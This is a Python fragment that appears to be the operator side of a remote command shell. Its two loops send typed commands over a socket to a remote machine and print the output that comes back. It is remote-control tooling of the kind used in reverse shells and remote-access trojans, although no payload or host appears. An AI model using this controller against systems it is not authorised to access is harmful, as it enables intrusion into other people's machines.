

def run_command(my_socket):
    print("[+] Running user Command")
    keep_running = True
    print("[+] Enter Command ")
    while keep_running:
        command = input(">> ")
        my_socket.send_data(command)
        if command == "stop" or command == "exit":
            keep_running = False

        command_result = my_socket.receive_data()
        print("[+] Command result is ----------------------------------------------------- \n", command_result)


def run_command_advanced(my_socket):
    print("[+] Running Advanced Command Mode")
    keep_running = True
    print("[+] Enter Command ")
    while keep_running:
        command = input(">> ")

        my_socket.send_data(command)
        if command == "stop" or command == "exit":
            keep_running = False

        command_result = my_socket.receive_serilized()
        print("[+] Command result is ----------------------------------------------------- \n")
        print(command_result["cmd_ouput"])